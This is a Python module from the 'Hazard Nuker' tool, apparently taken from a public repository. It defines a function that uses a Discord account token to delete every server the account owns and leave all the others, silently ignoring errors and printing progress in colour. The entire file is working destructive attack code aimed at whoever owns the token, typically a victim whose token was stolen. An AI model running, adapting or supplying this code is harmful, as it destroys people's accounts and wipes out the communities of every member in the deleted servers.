# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import requests
import Hazard

from colorama import Fore

from util.plugins.common import print_slow, getheaders

def Leaver(token):
    #get all servers
    guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            #Delete the servers the user owns
            requests.delete(f'https://discord.com/api/v9/guilds/'+guild['id'], headers=getheaders(token))
            print(f'{Fore.LIGHTRED_EX}Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

    for guild in guildsIds:
        try:
            #Leave servers the user is in
            requests.delete(
                f'https://discord.com/api/v9/users/@me/guilds/'+guild['id'],
                headers=getheaders(token))
            print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")
    print_slow(f"{Fore.LIGHTGREEN_EX}Successfully Left every server! ")
    print("Enter anything to continue. . . ", end="")
    input()
    Hazard.main()